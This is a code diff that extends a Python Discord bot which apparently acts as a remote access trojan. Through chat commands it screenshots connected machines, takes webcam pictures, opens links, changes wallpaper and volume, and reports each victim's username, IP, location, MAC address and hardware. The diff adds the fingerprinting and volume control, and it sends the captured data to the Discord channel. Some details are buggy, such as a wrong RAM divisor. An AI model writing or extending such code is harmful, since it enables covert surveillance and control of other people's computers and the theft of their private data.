@@ -5,9 +5,12 @@ import os
 import webbrowser
 import platform
 import time
+import pyvolume
 import sys
 import requests
+import psutil
 import ctypes
+import cpuinfo
 import getpass
 from tempfile import gettempdir as gettemppath
 import wget
@@ -44,23 +47,30 @@ def start():
             os.remove(wall_path)
 
 start()
-
+#########
 if os.path.isfile("tokens.env"):
     dotenv.load_dotenv("tokens.env")
 else:
     dotenv.load_dotenv(f"/home/{user}/Desktop/tokens.env")
 token = os.getenv("TOKEN")
 ipinfo_token = os.getenv("IPINFO_TOKEN")
+#########
+
+#token = ""
+#ipinfo_token = ""
 
 help_text = help_text = """```
 1. firefox     - opens Firefox on every machine connected
 2. ss          - screenshots every desktop connected 
 3. list        - lists all the connected users
-4  http_open   - opens a website on every connected machine, usage: !http_open https://example.com/
+4  http_open   - opens a website on every connected machine, usage: !http_open https://example.com/ mac_addr
 5. exit        - stops the bot
 6. help        - shows this list
 7. cam_pic     - takes a picture of the connected machines
-8.capture      - captures the screen multiple times, usage: !capture 5
+8. capture      - captures the screen multiple times, usage: !capture 5
+9. set_volume   - changes the volume, usage: !set_volume 20 mac_addr
+10. pull_pic    - downloads a pic to the tmp folder, usage !pull_pic https://i.pinimg.com/736x/7e/88/e2/7e88e27cfca500ef5d60fc03ddab8d04.jpg mac_addr
+11. dsk_change  - changes the wallpaper to the !pull_pic
 ```"""
 
 intents = discord.Intents.default()
@@ -81,10 +91,11 @@ async def firefox(ctx):
 @bot.command()
 async def ss(ctx, mac_address=None):
     if mac_address == get_mac_address():
+        user = getpass.getuser()
         ImageGrab.grab().save(path)
         file = discord.File(path)
         try: 
-            await ctx.send("Screenshot: ", file=file)
+            await ctx.send(f"Screenshot from: {user}, {mac_address}", file=file)
         except Exception as e:
             await ctx.send("Error with the ss")
         os.remove(path)
@@ -113,6 +124,10 @@ async def list(ctx):
     else:
         pass
     user = getpass.getuser()
+    cpu = cpuinfo.get_cpu_info()
+    cpu_info = cpu["brand_raw"]
+    ram = psutil.virtual_memory().total
+    ram_gb = ram / 905584384
     mac_addr = get_mac_address()
     ip = requests.get("https://api.ipify.org").text
     resp_county = requests.get(f"https://api.ipinfo.io/lite/{ip}?token={ipinfo_token}").json()
@@ -120,7 +135,7 @@ async def list(ctx):
     country = resp_county.get("country", "API problem")
     city = resp.get("city", "API problem")
     try: 
-        await ctx.send(f"OS: {os_full}\nUser: {user}\nIp: {ip}\nMac Address: {mac_addr}\nCountry: {country}\nCity: {city}\n========")
+        await ctx.send(f"OS: {os_full}\nUser: {user}\nCPU&GPU: {cpu_info}\nRAM: {ram_gb}Gb\nIp: {ip}\nMac Address: {mac_addr}\nCountry: {country}\nCity: {city}\n========")
     except Exception as e:
         await ctx.send("Error with fetching user list!")
 
@@ -151,13 +166,13 @@ async def http_open(ctx, link, mac_address=None):
             webbrowser.open(link)
             await ctx.send("Link opened!")
         except Exception as e:
-            print(f"Error: {e}")
+            await ctx.send(f"Error: {e}")
     elif mac_address == "all":
         try:
             webbrowser.open(link)
             await ctx.send("Link opened!")
         except Exception as e:
-            print(f"Error: {e}")
+            await ctx.send(f"Error: {e}")
     elif not mac_address:
         await ctx.send("Mac address filed is empty")
     else:
@@ -306,6 +321,29 @@ async def dsk_change(ctx, mac_address=None):
                 await ctx.send("Wallpaper changed!")
         except Exception as e:
             await ctx.send("Error!")
+    elif not mac_address:
+        await ctx.send("Mac address filed is empty")
+    else:
+        await ctx.send("Mac address not found!")
+
+@bot.command()
+async def set_volume(ctx, perc, mac_address=None):
+    mac_addr = get_mac_address()
+    perc = int(perc)
+    if mac_addr == mac_address:
+        if perc in range(0, 100):
+            await ctx.send(f"Changing volume to {perc}%..")
+            pyvolume.custom(percent=perc)
+            await ctx.send(f"Volume set to {perc}%!")
+        else:
+            await ctx.send(f"Select a number from 0 to 100, not {perc}")
+    elif mac_address == "all":
+        if perc in range(0, 100):
+            await ctx.send(f"Changing volume to {perc}%..")
+            pyvolume.custom(percent=perc)
+            await ctx.send(f"Volume set to {perc}%!")
+        else:
+            await ctx.send(f"Select a number from 0 to 100, not {perc}")
     elif not mac_address:
         await ctx.send("Mac address filed is empty")
     else:
